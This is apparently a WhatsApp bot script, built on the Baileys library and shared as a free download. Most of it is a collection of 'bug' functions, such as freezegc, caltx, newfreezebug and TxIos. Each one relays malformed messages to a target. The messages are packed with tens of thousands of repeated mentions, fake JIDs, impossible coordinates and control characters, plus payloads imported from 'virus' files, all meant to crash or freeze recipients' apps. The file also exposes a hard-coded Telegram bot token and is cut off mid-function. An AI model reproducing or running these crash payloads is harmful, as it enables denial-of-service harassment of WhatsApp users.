//base by LOST BOY X LORD TECH
//WhatsApp: https://whatsapp.com/channel/0029Vani1Mn5fM5WnZHzrK0T
//want more free bot scripts? subscribe to my youtube channel: 

const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))

const NodeCache = require('node-cache');

//bug database
const { teksbug1 } = require("./Noname/virtex.js")
const { teksbug2 } = require("./Noname/delay.js")
const { beta1, beta2, buk1 } = require("./lib/hdr.js")
//bug beta by badboi
const { ngazap } = require('./virus/ngazap')
const { crash } = require('./virus/crash')
const { buttonkal } = require('./virus/buttonkal')
const { cttl } = require('./virus/cttl')
const { tizi } = require('./virus/tizi')
const { weg } = require('./virus/weg')
const { virus7 } = require('./virus/virus7')
const { notif3 } = require("./virus/notif3")
const { notif4 } = require("./virus/notif4")

//bug sound import by badboi 
const darkphonk = fs.readFileSync('./C-SMedia/menu.mp3')
const bug = fs.readFileSync(`./C-SMedia/11.mp3`)
let premium = JSON.parse(fs.readFileSync('./dtbs/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
let owner = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./dtbs/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./dtbs/total-hit-user.json'))

//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/sticker.json'))
const ImageCsuit = JSON.parse(fs.readFileSync('./dtbs/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/apk.json'))

//time
const xtime = moment.tz('Ghana/Accra').format('HH:mm:ss')
        const xdate = moment.tz('Ghana/Accra').format('DD/MM/YYYY')
        const time2 = moment().tz('Ghana/Accra').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var lostboytimewisher = `Good Night  ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌌`
 }
 if(time2 < "19:00:00"){
var lostboytimewisher = `Good Evening ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌃`
 }
 if(time2 < "18:00:00"){
var lostboytimewisher = `Good Evening  ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌃`
 }
 if(time2 < "15:00:00"){
var lostboytimewisher = `Good Afternoon  ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌅`
 }
 if(time2 < "11:00:00"){
var lostboytimewisher = `Good Morning  ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌄`
 }
 if(time2 < "05:00:00"){
var lostboytimewisher = `Good Morning  ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌄`
 } 
module.exports = LostBoyTechInc = async (LostBoyTechInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplyCsuit.selectedRowId : (m.mtype == 'templateButtonreplyCsuitMessage') ? m.message.templateButtonreplyCsuitMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplyCsuit.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await LostBoyTechInc.decodeJid(LostBoyTechInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await LostBoyTechInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = LostBoyTechInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? LostBoyTechInc.user.id.split(':')[0] + "@s.whatsapp.net" || LostBoyTechInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(LostBoyTechInc, m, premium);
        
//group chat msg by xeon
const replyCsuit = (teks) => {
LostBoyTechInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./C-SMedia/menu3.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replyCsuit('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'LOSTBOY X LORDTECH',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}

//bug functions

let ppuser
try {
ppuser = await LostBoyTechInc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}
const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐏𝐫𝐞𝐥𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐏𝐫𝐞𝐥𝐗𝐳 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}

     async function caroLoc(target, pic, Ptcp = true ) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "-999999999999999999999999999",
            degreesLongitude: "-999999999999999999999999999",
            caption: "‌TRY 💔‌" + "@null".repeat(13000),
            sequenceNumber: "0",
            jpegThumbnail: pic
          }
        },
         carouselMessage: "{}"
      }
    }), {
      userJid: target,
      quoted: EsQl
    });
    await LostBoyTechInc.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
}
  //=======================
 async function Sinvi(target, Ptcp = true) {
     const userMention = {

        "type": "user",

        "userJid": target,

        "mention": "@" + target.split('@')[0], // This assumes the display name is the part before '@'

    };
   let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "🌑samMIC💀",
        locationMessage: {},
        hasMediaAttachment: true
       },
       body: {
        text: "🌑samMIC💀\n" + userMention.mention.repeat(17000),
       },
       nativeFlowMessage: {
        name: "call_permission_request",
        messageParamsJson: " Spider〽️ "
       },
       carouselMessage: {}
      }
     }
    }
   }), {
    userJid: target,
    quoted: EsQl 
   });

   await LostBoyTechInc.relayMessage(target, etc.message, Ptcp ? {
    participant: {
     jid: target
    }
   } : {});
   console.log(chalk.green("Send Bug By Spider V9〽️"));
  };   
  async function freezegc(target) {		
		    let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
		           groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " CSUIT" }]
                               }
                            }
						}
					},
				}), {
					userJid: target
				}
			);
			await LostBoyTechInc.relayMessage(target, etc.message, {});
		}
const extd = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "CSUIT🏴‍☠️"
}
}
};
async function freezekamoflase(target) {

    await LostBoyTechInc.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 414058.5,
                            degreesLongitude: 131518.0 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `CSUIT🏴‍☠️ ${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐑𝐞𝐚𝐥🦣" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function caltx(target) {
			let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								hasMediaAttachment: true,
								text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
								title: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
								contextInfo: { mentionedJid: [ "0@s.whatsapp.net" ] }
								},
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "CSUIT" }]
							}
						}
					},
				}), {
					userJid: target
				}
			);
			await LostBoyTechInc.relayMessage(target, etc.message, {});
		}
		
async function freezeuii(target) {

    await LostBoyTechInc.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " CSUIT" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function freezeui(target) {

    await LostBoyTechInc.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        viewOnceMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0 
                        },
                        hasMediaAttachment: false
                    },
                    body: {
                        text: `CSUIT ${"@254742491666 ".repeat(10000)}`,
           "contextInfo": { mentionedJid: [ "254742491666@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "254742491666@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐃𝐘𝐍𝐀𝐌𝐎 🦄 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function NewsletterZap(target) {
			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
				'viewOnceMessage': {
				   'key': {
                    'remoteJid': 'status@broadcast',
                     'fromMe': false,
                      'participant': '0@s.whatsapp.net'
                },
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": `${buttonkal}`,
							"jpegThumbnail": "",
							"caption": `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': target
			});
			await LostBoyTechInc.relayMessage(target, messageContent.message, {
				'participant': {
					'jid': target
				},
				'messageId': null
			});
		}
async function newfreezebug(target) {
    let virus = "𝐃𝐘𝐍𝐀𝐌𝐎 🦄 🔐";

    await LostBoyTechInc.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 7777099.1,
                            degreesLongitude: -922.999999999999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐃𝐘𝐍𝐀𝐌𝐎 🦄" + "@sammicv2".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐃𝐘𝐍𝐀𝐌𝐎 🦄 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function newvirpen(target) {
    let virus = "𝐃𝐘𝐍𝐀𝐌𝐈𝐂 🦄" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@null"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "𝐃𝐘𝐍𝐀𝐌𝐈𝐂 🦄"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virus 
                        }]
                    }
                }
            }
        }
    };

    await LostBoyTechInc.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
}
async function TxIos(target, Ptcp = false) {
			await LostBoyTechInc.relayMessage(target, {
					"extendedTextMessage": {
						"text": "⭑̤⟅̊༑ ▾ 𝐃𝐘𝐍𝐀𝐌𝐈𝐂⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "62895364760801@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "62895364760801@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "62895364760801@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "A̺͆N̺͆T̺͆I̺͆ G̺͆E̺͆D̺͆O̺͆R̺͆〽",
								"body": "尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"issampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug "));
		};
    //========================
    async function nulltag(target, ptcp = false) {
			await LostBoyTechInc.relayMessage(target, {
					extendedTextMessage: {
						text: "‎samMIC-V2\n" + "~@0~\n".repeat(30000),
						contextInfo: {
							mentionedJid: [
								"0@null",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@null`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@null",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@null",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: target,
							conversionSource: " p ",
